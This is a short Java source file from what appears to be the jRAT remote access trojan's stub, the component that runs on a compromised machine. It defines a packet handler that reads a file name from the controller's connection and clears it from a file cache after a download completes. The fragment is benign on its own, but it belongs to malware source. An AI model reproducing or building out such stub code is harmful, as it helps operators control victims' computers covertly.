package se.jrat.stub.packets.incoming;

import se.jrat.common.io.FileCache;
import se.jrat.stub.Connection;


public class Packet103CompleteClientDownload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		
		FileCache.remove(file);
	}

}
